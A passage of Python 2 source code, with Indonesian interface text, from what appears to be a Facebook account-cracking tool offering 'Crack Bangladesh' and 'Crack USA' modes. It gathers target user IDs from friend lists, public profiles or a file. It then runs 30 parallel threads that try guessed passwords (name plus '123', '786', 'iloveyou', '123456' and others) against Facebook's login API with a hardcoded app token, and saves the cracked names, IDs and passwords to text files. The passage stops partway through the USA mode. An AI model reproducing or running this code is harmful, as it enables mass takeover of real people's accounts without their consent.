																	print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
																	print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
																	print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos7
																	cek = open("done/indo.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
																		oke = open("done/indo.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
																			print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
																			print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos8
																			cek = open("done/indo.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;97m══════════════════════════════════════════════════════════════════════"
	print '\033[1;91m[\033[1;97m-\033[1;91m] \033[1;97mSelesai ...'
	print"\033[1;91m[\033[1;97m-\033[1;91m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97mfile tersimpan \033[1;91m: \033[1;92mdone/indo.txt'
	print 50* "\033[1;91m═"
	raw_input("\033[1;91m[•\033[1;97mKembali\033[1;91m•]")
	animate()
	
##### CRACK BANGLADESH #####
def crack_bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;95m═"
	print "\033[1;92m(\033[1;91m01\033[1;92m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;92m(\033[1;91m02\033[1;92m) \033[1;97mCrack Dari Publik/Teman"
	print "\033[1;92m(\033[1;91m03\033[1;92m) \033[1;97mCrack Dari File"
	print "\033[1;96m(\033[1;93m00\033[1;96m) \033[1;94mKembali"
	print 50* "\033[1;95m═"
	pilih_bangla()

#### PILIH BANGLADESH ####
def pilih_bangla():
	teak = raw_input("\033[1;96mPilih Nomer \033[94m?\033[1;93m ")
	if teak =="":
		print"\033[1;92m<\033[1;91m!\033[1;92m> \033[1;97mIsi Dengan Benar :)"
		pilih_bangla()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;92m═"
		print ("             \033[1;92m°°° \033[1;91mCRACK BANGLADESH \033[1;92m°°°")
		print 50* "\033[1;91m═"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;92m═"
		print ("             \033[1;92m°°° \033[1;91mCRACK BANGLADESH \033[1;92m°°°")
		print 50* "\033[1;91m═"
		idb = raw_input("\033[1;92m[\033[1;91m+\033[1;92m]\033[1;97m ID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idb+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;92m[\033[1;91m+\033[1;92m]\033[1;97m Nama \033[1;91m:\033[1;93m "+sp["name"]
		except KeyError:
			print"\033[1;92m{\033[1;91m!\033[1;92m} ID Publik/Teman Tidak Ada Boss !!"
			raw_input("\n\033[1;96m<\033[1;93m[Kembali]\033[1;96m>")
			crack_bangla()
		except requests.exceptions.ConnectionError:
			print"{!} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idb+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;92m═"
			print ("             \033[1;92m°°° \033[1;91mCRACK BANGLADESH \033[1;92m°°°")
			print 50* "\033[1;91m═"
			idlist = raw_input('\033[1;92m[\033[1;91m+\033[1;92m]\033[1;97m Nama File \033[1;91m:\033[1;90m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;92m{\033[1;91m!\033[1;92m} File Tidak Ada Boss !! '
			raw_input('\n\033[1;96m<\033[1;93m[Kembali]\033[1;96m>')
		except IOError:
			print '\033[1;92m(\033[1;91m!\033[1;92m) File tidak ada !'
			raw_input("\n\033[1;96m<\033[1;93m[Kembali]\033[1;96m>")
			crack_bangla()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;92m(\033[1;91m!\033[1;92m) Isi Dengan Benar :)"
		pilih_bangla()
	
	print "\033[1;92m[\033[1;91m+\033[1;92m]\033[1;97m Total ID \033[1;91m:\033[1;95m "+str(len(id))
	print('\033[1;92m[\033[1;91m+\033[1;92m]\033[1;97m Stop Tekan \033[1;90mCTRL+Z')
	titik = ['\033[1;92m. ','\033[1;93m.. ','\033[1;96m... ','\033[1;95m.... ','\033[1;97m..... ']
	for o in titik:
		print("\r\033[1;92m[\033[1;91m+\033[1;92m]\033[1;97m Crack \033[1;92mBerjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;92m[\033[1;91m+\033[1;92m] \033[1;97mGunakan \033[1;94mMode \033[1;96mPesawat \033[1;97mJika Tidak Ada Hasil")
	print ("\033[1;92m══════════════════════════════════════════════════════════════════════")
	
##### MAIN BANGLADESH #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/bangla.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos1
					cek = open("done/bangla.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/bangla.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos2
							cek = open("done/bangla.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/bangla.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos3
									cek = open("done/bangla.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('786786')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/bangla.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos4
											cek = open("done/bangla.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('bangladesh')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/bangla.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos5
													cek = open("done/bangla.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/bangla.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos6
															cek = open("done/bangla.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
																oke = open("done/bangla.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos7
																	cek = open("done/bangla.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
																		oke = open("done/bangla.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos8
																			cek = open("done/bangla.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;91m══════════════════════════════════════════════════════════════════════"
	print '\033[1;92m[\033[1;91m+\033[1;97m] \033[1;97mSelesai ...'
	print"\033[1;92m[\033[1;91m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;92m[\033[1;91m+\033[1;97m] \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97mfile tersimpan \033[1;90m: \033[1;92mdone/bangla.txt'
	print 50* "\033[1;92m═"
	raw_input("\033[1;92m<\033[1;91m[Kembali]\033[1;92m>")
	animate()
	
##### CRACK USA #####
def crack_usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m═"
	print "\033[1;94m(\033[1;91m01\033[1;97m) \033[1;92mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;91m02\033[1;97m) \033[1;92mCrack Dari Publik/Teman"
	print "\033[1;94m(\033[1;91m03\033[1;97m) \033[1;92mCrack Dari File"
	print "\033[1;93m(\033[1;96m00\033[1;93m) \033[1;97mKembali"
	print 50* "\033[1;91m═"
	pilih_usa()

#### PILIH USA ####
def pilih_usa():
	teak = raw_input("\033[1;97mPilih Nomer \033[91m?\033[1;94m ")
	if teak =="":
		print"\033[1;94m{\033[1;91m!\033[1;97m}\033[1;92m Isi Dengan Benar !"
		pilih_usa()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m═"
		print ("                \033[1;94m°°° \033[1;91mCRACK USA \033[1;97m°°°")
		print 50* "\033[1;91m═"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m═"
		print ("                \033[1;94m°°° \033[1;91mCRACK USA \033[1;97m°°°")
		print 50* "\033[1;91m═"
		idt = raw_input("\033[1;94m[\033[1;91m+\033[1;97m] \033[1;92mID Publik/Teman \033[1;94m:\033[1;97m ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mNama \033[1;91m:\033[1;94m "+op["name"]
		except KeyError:
			print"\033[1;94m<\033[1;91m!\033[1;97m> ID publik/teman tidak ada !"
			raw_input("\n\033(1;94m[\033[1;91mKembali\033[1;97m)")
			crack_usa()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m▬"
			print ("                \033[1;94m°°° \033[1;91mCRACK USA \033[1;97m°°°")
			print 50* "\033[1;91m▬"
			idlist = raw_input('\033[1;97m[\033[1;95m+\033[1;97m] \033[1;97mNama File\033[1;92m :\033[1;91m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;94m<\033[1;91m!\033[1;97m> File tidak ada ! '
			raw_input('\n\033[1;94m( \033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;94m<\033[1;91m!\033[1;97m> File tidak ada !'
			raw_input("\n\033[1;94m(\033[1;91mKembali\033[1;97m)")
			crack_usa()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;94m[\033[1;91m!\033[1;97m]\033[1;92m Isi Dengan Benar !"
		pilih_usa()
	
	print "\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mTotal ID \033[1;91m:\033[1;9pm "+str(len(id))
	print('\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mStop Tekan \033[1;93mCTRL+Z')
	titik = ['\033[1;92m. ','\033[1;93m.. ','\033[1;96m... ','\033[1;95m.... ','\033[1;97m..... ']
	for o in titik:
		print("\r\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mCrack \033[1;95mBerjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mGunakan \033[1;92mMode \033[1;96mPesawat \033[1;97mJika Tidak Ada Hasil")
	print ("\033[1;97m══════════════════════════════════════════════════════════════════════")
	
##### MAIN USA #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = ('iloveyou')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/usa.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos1
					cek = open("done/usa.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = ('123456')
